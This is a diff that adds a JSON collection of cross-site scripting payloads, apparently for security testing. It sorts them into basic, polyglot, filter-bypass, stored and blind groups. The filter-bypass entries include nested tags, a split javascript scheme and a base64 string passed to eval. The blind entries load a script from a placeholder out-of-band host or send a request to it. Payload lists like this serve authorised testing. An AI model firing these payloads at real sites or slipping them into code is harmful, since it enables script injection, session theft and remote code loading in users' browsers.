@@ -1,0 +1,27 @@
+{
+  "basic": [
+    "<script>alert(1)</script>",
+    "\"'><svg/onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<iframe src=\"javascript:alert(1)\"></iframe>"
+  ],
+  "polyglot": [
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  ],
+  "waf_bypass": [
+    "<scr<script>ipt>alert(1)</script>",
+    "<a href=\"javas\r\ncript:alert(1)\">Click me</a>",
+    "<svg/onload=confirm(1)>",
+    "<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>"
+  ],
+  "stored": [
+    "<script>alert('Stored XSS')</script>",
+    "<img src=x onerror=alert('Stored')>",
+    "<a href=javascript:alert('Stored')>Click me</a>"
+  ],
+  "blind": [
+    "\"><script src=//YOUR_OAST_DOMAIN/a.js></script>",
+    "<img src=//YOUR_OAST_DOMAIN/log?c=>"
+  ]
+}
